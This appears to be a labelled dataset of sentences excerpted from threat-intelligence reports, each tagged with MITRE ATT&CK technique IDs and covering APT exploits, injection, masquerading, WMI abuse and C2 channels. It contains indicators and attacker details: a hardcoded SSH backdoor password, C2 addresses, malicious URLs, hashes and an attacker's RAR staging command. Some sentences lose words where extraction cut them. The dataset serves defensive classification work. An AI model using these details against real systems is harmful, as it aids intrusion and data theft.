CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory	['T1203']
Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882	['T1203']
An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar… Our journey begins with an RTF file named “New Salary Structure 2017.doc”, which exploits CVE-2017-0199	['T1203']
Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability	['T1203']
Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware	['T1203']
We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell	['T1203']
Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash	['T1068']
APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure	['T1068']
Exploitation of this vulnerability allows an attacker to escalate privileges on the affected system	['T1068']
All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash	['T1068']
APT32 regularly used stealthy techniques to blend in with legitimate user activity:  During one investigation, APT32 was observed using a privilege escalation exploit (CVE-2016-7255) masquerading as a Windows hotfix	['T1068']
Documents with the Flash exploit managed to evade static defenses and remain undetected as an exploit on VirusTotal	['T1068']
McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk	['T1068']
The database is located in the “/usr/lib/cva-ssys/My_BD” folder (“~/.local/cva-ssys/My_BD”—if the Trojan does not have root privileges)	['T1068']
CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14	['T1068']
The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges	['T1068']
Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign	['T1068']
OfficeScan’s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed. Trend Micro™ Deep Discovery™ provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update	['T1068']
Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions	['T1068']
Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit.	['T1068']
A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment	['T1518.001']
The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products	['T1518.001']
Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools	['T1518.001']
In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan	['T1518.001']
When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms	['T1518.001']
APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed	['T1518.001']
Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible	['T1518.001']
We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback	['T1518.001']
In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools	['T1518.001']
Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine	['T1518.001']
Additionally it checks to determine if common analysis tools are currently running on the infected system	['T1518.001']
"Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled ""Analysis of ""Northern New Year in 2017"" and used the official logo of the Korean Ministry of Unification"	['T1518.001']
Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense	['T1518.001']
Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called “Rocket Kitten” (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters	['T1518.001']
As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads	['T1518.001']
The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public	['T1518.001']
They are known for “living off the land,” meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target	['T1518.001']
Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware	['T1518.001']
End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats	['T1518.001']
As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure	['T1518.001']
Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys’ bidding—delivering malware to their victims	['T1518.001']
Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat	['T1518.001']
AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products	['T1518.001']
Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability	['T1518.001']
The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged.	['T1518.001']
The RIPTIDE exploit document drops its executable file into the C:\Documents and Settings\{user}\Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\ folder	['T1005']
In many payment card data breaches, a point-of-sale (POS) system is infected with malware that searches for specific processes in memory known to store card data in plain text	['T1005']
Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites.	['T1005']
Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts	['T1090']
In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server	['T1090']
This can be complemented by restricting direct internet access to the company’s internal networks while using proxies to access external resources	['T1090']
Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)	['T1021.001']
Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business	['T1021.001']
FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts	['T1021.001']
To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip	['T1560']
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension	['T1560']
On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018	['T1560']
RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”	['T1560']
RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”	['T1560']
When exfiltrating the keychain, the keychain field is used instead of data	['T1560']
Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive	['T1560']
The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy	['T1560']
The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.	['T1560']
Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance	['T1021']
Figure 4 – Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered	['T1021']
APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services	['T1110']
During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples	['T1110']
We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease	['T1110']
It then takes note of the infected machine’s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine	['T1110']
Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels	['T1110']
Several of the tools are freely-available Windows utilities, such as Amplia Security’s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.	['T1110']
We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled	['T1110']
Common TCP ports 80 and 443 are used to blend in with routine network traffic	['T1571', 'T1043']
Resulting script on the compromised government websites Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code	['T1571', 'T1043']
PUPY LOADER The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android	['T1571', 'T1043']
In addition, although the 2017 campaign has been documented, during our research regarding MirageFox, we found a recently uploaded binary (6/8/2018) from the 2017 campaign, pretty much identical to a RAT mentioned in their RoyalAPT report, barely detected with only 7/66 detections on VirusTotal.  APT15 Code Reuse We found the new version of the RAT on VirusTotal hunting, by a YARA signature we created based off code only found in Mirage and Reaver, both attributed to Chinese government affiliated groups	['T1571', 'T1043']
These files are then transmitted to a threat actor, often over commonly open ports 80 and 443 (HTTP and HTTPS)	['T1571', 'T1043']
KONNI is a RAT that is believed to have  been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure	['T1571', 'T1043']
Command and control To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53, 80, and 443	['T1571', 'T1043']
Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.	['T1571', 'T1043']
The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as” over TCP port 443.	['T1571', 'T1043']
The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500	['T1571']
1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5	['T1571']
Figure 5 shows Phishery’s output to the command that injects a URL into a file named “good_test.docx”, which it will save the resulting file to “bad_test.docx”	['T1055']
It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it	['T1055']
As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory	['T1055']
Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185	['T1055']
This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process	['T1055']
Traps 4.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code	['T1055']
05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes	['T1055']
Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory	['T1055']
Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements	['T1055']
2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time	['T1055']
*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it	['T1055']
64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3	['T1055']
The loader will then inject a DLL backdoor into dllhost.exe	['T1055']
TClient is injected into dllhost.exe Malware Analysis  wab32res.dll (FakeRun loader) loads TClient	['T1055']
Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services	['T1055']
Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3	['T1055']
It’s also used to inject code into its target processes using the technique.	['T1055']
wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)	['T1047']
POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)	['T1047']
Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000	['T1047']
WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell	['T1047']
Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory	['T1047']
WMI classes are the primary structure within WMI	['T1047']
WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others	['T1047']
APT29 then created a WMI event subscription in order to execute the backdoor	['T1047']
In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration	['T1047']
This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics	['T1047']
This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations	['T1047']
The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.	['T1047']
The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment	['T1047']
Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan	['T1047']
Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI	['T1047']
WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators	['T1047']
This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators	['T1047']
This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.    The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment	['T1041']
The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()	['T1041']
In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server	['T1041']
After obtaining the unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of its status of “1” to notify the server it had successfully received the filename and file data	['T1041']
The r1.log file stores information for exfiltration	['T1074']
After Comnie has been copied to the %TEMP% directory, it will look for the presence of the ‘DQuit.tmp’ file in this path	['T1074']
Log.php validates the sender by User-Agent, saves the data in the “UP” server directory and stores the metadata in the mssql database for later reference	['T1074']
Note: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions	['T1218.011']
The dropper installs 2 files:netwf.bat : executes netwf.dllnetwf.dll : the payloadThe dropper implements 2 persistence mechanisms:HKCU\Environment\UserInitMprLogonScript to execute the netwf.bat fileCOM Object hijack of the following CLSID: {BCDE0395-E52F-467C-8E3D-C4579291692E}, the CLSID of the class MMDeviceEnumerator.These 2 techniques have also been previously used by this actor.Finally the payload is executed by rundll32.exe (and the ordinal #1 in argument) or by explorer.exe if the COM Object hijack is performed	['T1218.011']
The loader component is executed via RUNDLL32.EXE	['T1218.011']
Then it checks to see if it was launched by RUNDLL32.exe along with parameter #1	['T1218.011']
If the string is present, the malware executes the command RunDll32.exe	['T1218.011']
It loads the module with parameter vShow set to zero, which opens the application with a hidden window.  Alternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe	['T1218.010']
regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.    The script attempts to load the malicious module using regsvr with the run function.   Procmon shows the malicious module loaded to the Avast process	['T1218.010']
The malicious modules in regsvr32.exe memory After the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded	['T1218.010']
If Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:   It will target unins000.exe if it is available	['T1218.010']
The Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.   The downloaded modules found in regsvr32.exe as detected by the Cybereason platform	['T1218.010']
After selecting a payload URL, the script will create copies of certutil and regsvr32 to the temp directory for later use	['T1218.010']
8 Making a copy of certutil and regsvr32 Certutil.exe (a copy is renamed to certis.exe by the trojan) is normally used in a windows environment to manage certificates, but in this case, it is used by the second stylesheet to download the malware payloads	['T1218.010']
11 AV detection If there is no Avast install present, the script proceeds to the final .dll execution using regsvr32 and quits	['T1218.010']
After unpacking the module, it is packed with an additional inner packer Pe123\RPolyCryptor	['T1027.002']
BlackEnergy2 was eventually seen downloading more crimeware plugins – a custom spam plugin and a banking information stealer custom plugin	['T1027.002']
Flash object in the .docx file, stored in uncompressed format The Flash object contains an ActionScript which is responsible for extracting the exploit using a custom packer seen in other FinSpy exploits	['T1027.002']
The PCODE of the virtual machine is packed with the aplib packer	['T1027.002']
While we can only speculate on the specific reason, it is likely Sofacy packed only the Delphi variants in an attempt to increase evasion as the Delphi variant of Zebrocy is known and has been widely analyzed	['T1027.002']
The MSIL file contains the packed core payload in its .Net resource section	['T1027.002']
Two modifications are made to UPX version 3.91:  The magic bytes UPX! in the UPX header are replaced with ASS7, The decompressed code and strings sections are XORed with 0x01	['T1027.002']
Figure 6: Difference between a stock UPX packed file and the modified one A patch for UPX is available on ESET’s malware-research Github repository that allows unpacking Keydnap’s backdoor with the usual upx -d	['T1027.002']
See the following for more information and examples of false flags being used in cyberattacks: Wave your false flags! …or the Nightmares and Nuances of a Self-Aware Attribution Space OlympicDestroyer is here to trick the industry Malware description The malware was first seen packed with VMProtect; when unpacked the sample didn’t show any similarities with previously known malware	['T1027.002']
(Source: Dell SecureWorks) In SWCs analyzed by CTU researchers, the threat actors added the Dean Edwards packed JavaScript code shown in Figure 9 to the end of a legitimate website's menu page	['T1027.002']
First, the sample is UPX packed	['T1027.002']
Data Exfiltration The second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate	['T1115']
Cadelspy’s main payload contains its back door functionality, allowing the threat to carry out the following activities:  Log keystrokes and the titles of open windows Gather clipboard data and system information Steal printer information and any documents that were sent to be printed Record audio Capture screenshots and webcam photos  Cadelspy compresses all of the stolen data into a .cab file and uploads it to the attacker’s C&C servers	['T1115']
Scan the network environment of the infected machine; checks for availability of specific ports on servers that share the same internal and external subnet mask (i.e 255.255.0.0\16)	['T1046']
Mimikatz The threat actors also uploaded tools to scan for and exploit potential vulnerabilities in the network, such as the well-known SMB vulnerability patched in commonly exploited by EternalBlue to move laterally to other systems on the network.	['T1046']
What changes in the code can we see in such short time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a file named wi.exe while the other was not	['T1036']
Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta    nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35    rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0    Table 5	['T1036']
Filename SHA256 Description   7za.exe dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta   hb.exe 3ca3a957c526eaeabcf17b0b2cd345c0fffab549adfdf04470b6983b87f7ec62 Hobocopy   nbt.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35   rx.exe a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0   tardigrade.exe fe1b011fe089969d960d2dce2a61020725a02e15dbc812ee6b6ecc6a98875392 Tardigrade application	['T1036']
"In one instance, the threat actor gained remote access to a high-value system in a compromised network, ran quser.exe to identify existing RDP sessions on the device, immediately ran a command to compile a RAR archive that specified file types the threat actor did not want, and used a password to encrypt the archive:  YYYY-MM-DD hh:mm:ss     quser YYYY-MM-DD hh:mm:ss     C:\windows\temp\svchost.exe a -m5 -v2000m -hp{password} -inul -r ""{destination_file.rar}"" ""{multiple user directories linked to the victim's projects}"" -x*.exe -x*.msi -x*.cab -x*.inc -x*.dll -x*.db -x*.mdb -x*.htm -x*.html -x*.css -x*.jar -x*.js -x*.tmp -x*.bak -x*.dat -x*.log -x*.xml -x*.dmp -x*.dbf -x*.avi -x*.mp3 -x*.mp4 -x*.mpg -x*.mpeg -x*.asp -x*.aspx -x*.gif -x*.jpg -x*.mpp -x*.pst  The threat actors typically rename the encrypted RAR archives"	['T1036']
SHA256  a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff   MD5 1ff40e79d673461cd33bd8b68f8bb5b8   Compiled 2017.08.06 11:32:36 (GMT), 2.22   Type I386 Windows Console EXE   Size 101 888    Instead of implementing this auxiliary module in the form of a dynamic linked library with its corresponding exported functions, the developers decided to use a standalone executable started by events.exe with the following parameters:    Parameter Description   -scr Screenshot file name to save in Cache006 subdirectory, zipped with password from configuration	['T1036']
The file is named netwf.dat	['T1036']
The account names visually look similar to legitimate government organization names or other trusted third-party entities	['T1036']
The initial overlap was based on the filename wmssl.exe, which was seen as an executable name that Cannon would move the wmssl.txt attachment to install and execute a secondary payload	['T1036']
Writing executables to a randomly-selected directory under Program Files, and naming the EXE to match the chosen directory name, or, if that fails, writing the executable to a system-generated temporary file name, using the EXE extension   3	['T1036']
The malware drops the Windows batch file dx.bat, which attempts to kill the task daumcleaner.exe; a Korean security program	['T1036']
The “VPN Client” is a legitimate Juniper VPN software bundled with Helminth,  a malware in use by the OilRig threat agnet: JuniperSetupClientInstaller.exe 6a65d762fb548d2dc56cfde4842a4d3c (VirusTotal link) If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed	['T1036']
For example, we analyzed a DropIt sample (SHA256: cca268c13885ad5751eb70371bbc9ce8c8795654fedb90d9e3886cbcfe323671) that dropped two executables, one of which was saved to “%TEMP%\flash_update.exe” that was a legitimate Flash Player installer	['T1036']
Figure 10: Network traffic to download final payload (words.exe) Once executed, the file performs the following activities:  Drops a copy of itself in %AppData%\svchost.exe\svchost.exe and drops an XML file, which contains configuration information for Task Scheduler (as shown in Figure 11)	['T1036']
Firstly, the reason this has been named MirageFox instead of just Mirage, is because in the Export directory for the modules, the name field is filled with a string MirageFox_Server.dat	['T1036']
The wave against the government entity (June 26) also involved a simple PE file attachment (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe	['T1036']
After the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell script with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name	['T1036']
The Downloader After the exploit or script executes, the system downloads install.exe, which has the following metadata: MD5             5a0c4e1925c76a959ab0588f683ab437 Size            46592 bytes Compile Time    2014-11-19 08:55:10Z Import Hash     6b8611f8148a6b51e37fd68e75b6a81c The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path “C:\Users\Public”, which fails on Windows XP because that path is not present by default	['T1036']
One example of these samples is given below: SHA256:6500636c29eba70efd3eb3be1d094dfda4ec6cca52ace23d50e98e6b63308fdb The file is a self-extracting RAR, which is a common delivery mechanism for PlugX particularly when the eventual payload will be sideloaded by a legitimate executable	['T1036']
Filename qrat.exe   File Size 1093120 bytes   MD5 c05e5131b196f43e1d02ca5ccc48ec0e   SHA1 f28c592833f234c619917b5c7d8974840a810247   Notes Dropper that installs QuasarRAT file microsoft_network.exe and scheduled task wrapper file Microsoft.Win32.TaskScheduler.dll	['T1036']
Filename  Part-I.doc    File Size  11349102 bytes    MD5  92942c54224cd462dd201ae11a560bb8    SHA1  85a21624df2211af3daf05c86a3fbea8271059d3    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe	['T1036']
Filename  Part-II.doc    File Size  10156713 bytes    MD5  e32668e569362c96cc56db368b7e821e    SHA1  dadc493abbe3e21610539e1d5a42f523626a6132    Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file mico-audio.exe	['T1036']
When the shellcode embedded within the malicious EPS is executed, the following three files are dropped:  %PROGRAMDATA%\Microsoft\DeviceSync\VMwareCplLauncher.exe %PROGRAMDATA%\Microsoft\DeviceSync\vmtools.dll %PROGRAMDATA%\Microsoft\DeviceSync\MSBuild.exe  In the list of dropped files, VMwareCplLauncher.exe is a legitimate, signed VMware executable that serves to ultimately deliver the BADNEWS payload	['T1036']
The vmtools.dll file is a modified DLL that both ensures persistence and loads MSBuild.exe, which is the BADNEWS malware renamed to spoof a legitimate Microsoft Visual Studio tool	['T1036']
These digital certificates are often issued in the name of rogue and legitimate companies to avoid arousing suspicion from researchers and incident responders	['T1036']
In one instance we observed, one of the initial malware delivered to the victim, RATANKBA (TROJ_RATANKBA.A), connects to a legitimate but compromised website (eye-watch[.]in:443, a mobile application-selling site) from which a hack tool (nbt_scan.exe) is also downloaded	['T1036']
One archive sample analyzed by CTU researchers contained a legitimate PDF file, a benign image of interest to targets (see Figure 8), and an HttpBrowser installer disguised as an image file	['T1036']
The legitimate owaauth.dll file resides in %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\Auth\ while CTU researchers have observed the backdoor using the same filename in the %ProgramFiles%\Microsoft\Exchange Server\ClientAccess\Owa\bin\ directory	['T1036']
It was pretending to be an Adobe flash player update installer on a compromised website to lure users to click for the execution	['T1036']
Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors.	['T1036']
likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor	['T1036']
Using a custom User Agent string or the system's User Agent string derived from urlmon.dll   7	['T1543.001']
Persistence Once started, the Keydnap backdoor installs a plist file in /Library/LaunchAgents/ if it has root privileges or $USER/Library/LaunchAgents/ otherwise to achieve persistence across reboots	['T1543.001']
Figure 6 shows the Glimpse server responding to an inbound beacon from the Glimpse agent and sending a command whoami	['T1033']
The screenshot also shows the Glimpse server receiving the results of the whoami command executed by the agent	['T1033']
The webshell will save the archives locally to the server in the C:\Users\Public\Libraries\Recorded\Files folder, each with a filename with the following structure: [IP address]_c$_Users_[username]__[Desktop-Documents-Downloads]_[year]-[month]-[day]-[hours]-[minutes]-[seconds].7z It is likely that the threat actors use this functionality to rapidly check for new files created by users on the network	['T1033']
This document was also the first of the mid-November cluster which used the user/USER author name instead of Joohn, further supporting the scenario of the document being copied between systems	['T1033']
